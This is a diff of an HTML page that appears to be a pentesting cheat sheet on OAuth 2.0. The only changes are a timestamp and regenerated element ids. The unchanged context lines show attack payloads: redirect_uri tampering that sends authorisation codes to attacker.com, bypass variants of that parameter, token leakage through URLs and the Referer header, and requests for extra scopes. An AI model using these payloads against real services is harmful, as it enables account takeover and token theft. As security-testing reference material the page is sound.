@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 14:12 -->
+<!-- 2026-07-20 Mon 15:42 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>OAuth 2.0</title>
@@ -931,7 +931,7 @@ If <code>redirect_uri</code> is not strictly validated, redirect the
 authorisation code to an attacker-controlled server.
 </p>
 
-<pre class="example" id="orgc40cc06">
+<pre class="example" id="orgb889ac2">
 https://auth.target.com/oauth/authorize
   ?client_id=abc
   &amp;redirect_uri=https://attacker.com/callback
@@ -942,7 +942,7 @@ https://auth.target.com/oauth/authorize
 <p>
 Variations to try:
 </p>
-<pre class="example" id="org63ad629">
+<pre class="example" id="org9571e7e">
 redirect_uri=https://attacker.com
 redirect_uri=https://target.com@attacker.com
 redirect_uri=https://target.com.attacker.com
@@ -978,7 +978,7 @@ external resources, the token leaks via the Referrer header.
 <p>
 Check for <code>access_token</code> in the URL fragment or query string:
 </p>
-<pre class="example" id="orgd87b78e">
+<pre class="example" id="orgc405650">
 https://target.com/callback#access_token=&lt;token&gt;
 </pre>
 </div>
@@ -991,7 +991,7 @@ Test whether requesting additional scopes beyond what is granted
 is enforced server-side.
 </p>
 
-<pre class="example" id="org26f0629">
+<pre class="example" id="orgbeb8c43">
 scope=openid email profile admin
 </pre>
 </div>
